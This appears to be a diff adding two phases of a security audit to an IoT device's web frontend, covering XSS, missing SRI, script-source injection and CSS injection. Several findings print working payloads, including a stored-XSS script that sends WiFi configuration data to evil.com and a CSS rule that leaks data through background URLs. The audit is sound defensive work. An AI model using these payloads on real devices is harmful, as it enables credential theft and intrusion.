@@ -560,5 +560,44 @@ Files: `www/js/theme-boot.js`, `www/js/icons.js`, `www/js/core.js` (bootstrap se
 
 ---
 
+## Phase 26 — Frontend Pages & Sensor Views
+
+Files: `www/js/pages.js`, `www/js/sensors.js`, `www/js/iot-extensions.js`
+
+| # | Severity | Issue | Fix | Status |
+|---|---|---|---|---|
+| 26.1 | H | pages.js:217-235 `dbBuildCardHtml` — Builds `<div class="sensor-card-mini" data-key="' + key + '">...<span title="' + p.id + '">' + (p.name \|\| p.id) + '</span>... <span class="sensor-card-mini-metric">' + p.metric + '</span>...'` then L196 `grid.innerHTML = pairs.map(dbBuildCardHtml).join("")`. **`p.id`, `p.name`, `p.metric` are NEVER passed through `esc()`**. Sensor IDs come from platform_config.json (user-controllable, no validation per 13.7 family). Malicious id `x"><script>fetch('/api/modules/wifi').then(r=>r.text()).then(t=>fetch('//evil.com/?'+btoa(t)))</script>` runs on every dashboard load with full /api/* access. **STORED XSS**. | Wrap every interpolation in `esc()`: ``'<div data-key="' + esc(key) + '">...<span title="' + esc(p.id) + '">' + esc(p.name \|\| p.id) + '</span>...'``. | Pending |
+| 26.2 | H | pages.js:32-89 `dbLoadUPlot` — Loads uPlot from `https://cdn.jsdelivr.net/npm/uplot@1/dist/uPlot.iife.min.js` via `<script src>` with NO Subresource Integrity (SRI) hash. CDN compromise / DNS hijack delivers arbitrary JS executing in the SPA's authenticated context (full /api/* access, can rotate WiFi creds, flash OTA, etc.). | Add `integrity="sha384-..."` and `crossorigin="anonymous"` attributes to the dynamic script element. Pin version (not `uplot@1`). | Pending |
+| 26.3 | H | pages.js:74, L31 — `localSrc = th.chartLocalPath \|\| "/uPlot.iife.min.js"`. `chartLocalPath` is ThemeConfig user input (saved via /save_theme and /api/modules/theme). Then `s.src = localSrc` injects it into a `<script src=>`. Setting chartLocalPath=`"//evil.com/x.js"` (protocol-relative URL bypasses `javascript:` URL-scheme blocking) loads attacker JS at every dashboard mount. Validation gap from 13.7 has direct script-execution impact. | Validate chartLocalPath server-side: reject anything not matching `^/[a-zA-Z0-9._-]+\.js$`. Client-side, also strip protocol-relative `//`. | Pending |
+| 26.4 | M | pages.js:1057-1059 `modeEl.innerHTML = "🌐 Online Logger";` — static strings only. OK in isolation. But mode comes from `d.mode` (L1057 `if (d.mode === "online")`) — a server-controlled string used in conditional logic. If backend ever sends a non-canonical value, no fallback shows raw mode value as plain text (acceptable for diagnostics). | Cosmetic only. | Pending |
+| 26.5 | M | sensors.js:42-58 `pcfgSave` — POSTs to `/save_platform` with `Content-Type: application/octet-stream` but a JSON body. Backend accepts via raw body buffer, but the wrong content-type may cause future middleware / proxies to reject. | Use `Content-Type: application/json`. | Pending |
+| 26.6 | L | sensors.js:11 `PCFG = null` — module-global cache mutated by multiple init paths. Concurrent fetches (e.g. user clicks "Reload" while load in flight) race; latter response overwrites the first. | Hold an in-flight promise and dedup like core.js `_csrfFetch`. | Pending |
+| 26.7 | I | sensors.js — Consistently uses `esc()` on every user-controllable interpolation (L200, L222-242, L862, L904, L1144). **Good hygiene; contrast with pages.js (26.1).** | [MODULE SAFE for the audited render paths] | N/A |
+| 26.8 | I | iot-extensions.js — Uses `esc()` on user-controllable interpolations in the audited render paths (L441, L443, alert renders). Page-template `innerHTML` blobs (L155, L469, L670) are static HTML constants. | [MODULE SAFE for the audited render paths] | N/A |
+| 26.9 | M | pages.js / sensors.js / iot-extensions.js — Heavy reliance on `innerHTML` for dynamic grid/list rendering. Every page navigation builds large HTML strings and reflows. Performance OK at current data volumes but degrades with N sensors > 16 or many alert rules. | Long-term: switch to template literals + `<template>` cloning, or a tiny VDOM library. | Pending |
+
+---
+
+## Phase 27 — Frontend Settings & Shell
+
+Files: `www/js/settings.js`, `www/index.html`, `www/style.css`
+
+| # | Severity | Issue | Fix | Status |
+|---|---|---|---|---|
+| 27.1 | H | settings.js:34-55 `sdInit` — Builds System Info card via concatenated `innerHTML` interpolating `d.version`, `d.boot`, `d.mode`, `d.cpu`, `d.chip` from `/api/status` **WITHOUT `esc()`** on any of them. Today the fields are server-controlled (firmware version, chip model from `ESP.getChipModel()`, etc.) but the trust-the-server pattern is fragile: ESP.getChipModel returns whatever the SDK chooses, and a future bug or backdoor could place attacker content there. Same pattern as 26.1; lower exploit likelihood but identical class. | Wrap every interpolation in `esc()`. | Pending |
+| 27.2 | M | settings.js — Many other innerHTML sites (network/datalog/theme renders) similarly interpolate without consistent escaping. Each must be audited individually; spot checks show mixed hygiene compared to sensors.js. | Run a project-wide grep for `innerHTML.*\+` patterns and wrap user-data in `esc()`. | Pending |
+| 27.3 | M | index.html:17, 766-774 — 6 sequential `<script src=>` tags loaded synchronously (no defer/async). Total bundle is ~6K lines of JS (theme-boot + core + icons + pages + settings + sensors + iot-extensions). First-paint blocked by full parse. Documented constraint (L763 comment: "load order matters, shared globals") — but defer with strict load-order is supported by all modern browsers. | Add `defer` to all `<script src>` tags from `/js/core.js` onwards (theme-boot stays sync). Re-test load order with `defer`. | Pending |
+| 27.4 | M | index.html:80, L92-100 (and others) — `data-args='["restartPopup"]'` style attributes drive `showPopup(id)` (25.10 — no id whitelist). Markup-injected `data-args='["someOtherPopup"]'` could trigger arbitrary popup if attacker can inject DOM. Tied to 25.10 fix. | Apply 25.10 whitelist. | Pending |
+| 27.5 | L | index.html:13 `<style id="themeVars"></style>` — Empty `<style>` placeholder for runtime CSS-variable injection. If applyStatus ever writes UNescaped user values (e.g. `--primary-color: ${config.theme.primaryColor}` with malicious value `red; } body { background: url(//evil.com/log?...) } #x {`), CSS-injection enables data exfiltration via `background-image: url(...)` requests. Tied to 13.7 (ThemeModule accepts unvalidated colors). | Server-side: validate every color field with `^#[0-9a-fA-F]{6}$`. Client-side: when writing themeVars, escape `;` `{` `}` `*/`. | Pending |
+| 27.6 | I | index.html — Grep confirms ZERO inline event handlers (`onclick=`, `onload=`, `onerror=`, etc.) across index.html AND all /www/pages/*.html. **Excellent CSP posture** — `script-src` can drop 'unsafe-inline' for non-failsafe builds (WebServer.cpp:374 still has it for the FAILSAFE_HTML which has inline scripts). | Audit WebServer.cpp:371-381 CSP — once FAILSAFE_HTML is updated to also use external scripts, drop `'unsafe-inline'` from script-src. | Pending |
+| 27.7 | I | style.css:9-19 `@font-face` with `src: url("/fonts/...woff2")` — local fonts only, no Google Fonts CDN. CSP `font-src 'self'` covers it. Good offline-first design. | [MODULE SAFE] | N/A |
+| 27.8 | L | style.css:375 `background-image: url("data:image/svg+xml;utf8,<svg...");` — inline data: URI in CSS. Backend CSP has `img-src 'self' data:` so it's allowed. Safe in this static instance but represents general data: URI permissiveness in the policy. | Acceptable trade-off. | N/A |
+| 27.9 | M | settings.js — Every settings page makes 1-3 sequential fetches without timeout (4.8 family). Slow backend (e.g. wedged fsMutex per 8.x family) leaves settings pages "Loading…" forever. | Apply 4.8 fix across all fetches. | Pending |
+| 27.10 | I | index.html — Uses `data-click="..."`, `data-args='[...]'` consistently for event wiring through core.js Handlers map (25.4). No inline JS, no eval, no `Function()`. **Excellent CSP/XSS posture for the SPA shell**. | [MODULE SAFE for the shell structure] | N/A |
+| 27.11 | L | index.html:69-73 `data-click="quickThemeToggle"` and other handlers reference Handlers map entries. If `quickThemeToggle` is not registered (e.g. due to a bundling order bug), the dispatcher silently no-ops — user clicks have no effect with no error message. | Log a console warning when Handlers[name] is missing in `_dispatchEvent`. | Pending |
+| 27.12 | M | settings.js:36-54 interpolates `d.version`, etc., into the System Info card. If a future `/api/status` payload field becomes user-controllable (e.g. via deviceName flowing into mode display), no escape boundary. Defensive programming missing. | Same as 27.1/27.2. | Pending |
+
+---
+
 ---
 
